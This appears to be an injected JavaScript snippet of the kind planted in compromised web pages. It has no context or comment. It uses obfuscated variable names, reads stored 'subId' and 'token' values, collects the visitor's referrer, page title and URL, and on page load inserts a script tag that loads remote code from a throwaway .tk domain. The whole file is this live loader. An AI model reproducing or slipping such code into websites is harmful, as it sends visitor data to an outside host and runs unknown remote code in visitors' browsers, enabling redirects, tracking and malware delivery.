  (function() {
    var name = '_SR7Dz3397MTK7p1b';
    if (!window._SR7Dz3397MTK7p1b) {
        window._SR7Dz3397MTK7p1b = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://whiranjafusboooo.tk/2cVxpB',
            P_PATH: 'https://whiranjafusboooo.tk/fec84ce/postback',
        };
    }
    const _PBDY5BkvhPvZ3GMQ = localStorage.getItem('config');
    if (typeof _PBDY5BkvhPvZ3GMQ !== 'undefined' && _PBDY5BkvhPvZ3GMQ !== null) {
        var _xG1tbWWswLhNhdjS = JSON.parse(_PBDY5BkvhPvZ3GMQ);
        var _gJMgcQww81w4zNTn = Math.round(+new Date()/1000);
        if (_xG1tbWWswLhNhdjS.created_at + window._SR7Dz3397MTK7p1b.ttl < _gJMgcQww81w4zNTn) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _jkSCZnNh76B5vSwB = localStorage.getItem('subId');
    var _ghGBgKDvZtLF6BnJ = localStorage.getItem('token');
    var _vFGHgyMMSwxMr1hV = '?return=js.client';
        _vFGHgyMMSwxMr1hV += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _vFGHgyMMSwxMr1hV += '&se_referrer=' + encodeURIComponent(document.referrer);
        _vFGHgyMMSwxMr1hV += '&default_keyword=' + encodeURIComponent(document.title);
        _vFGHgyMMSwxMr1hV += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _vFGHgyMMSwxMr1hV += '&name=' + encodeURIComponent(name);
        _vFGHgyMMSwxMr1hV += '&host=' + encodeURIComponent(window._SR7Dz3397MTK7p1b.R_PATH);
    if (typeof _jkSCZnNh76B5vSwB !== 'undefined' && _jkSCZnNh76B5vSwB && window._SR7Dz3397MTK7p1b.unique) {
        _vFGHgyMMSwxMr1hV += '&sub_id=' + encodeURIComponent(_jkSCZnNh76B5vSwB);
    }
    if (typeof _ghGBgKDvZtLF6BnJ !== 'undefined' && _ghGBgKDvZtLF6BnJ && window._SR7Dz3397MTK7p1b.unique) {
        _vFGHgyMMSwxMr1hV += '&token=' + encodeURIComponent(_ghGBgKDvZtLF6BnJ);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._SR7Dz3397MTK7p1b.R_PATH + _vFGHgyMMSwxMr1hV;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
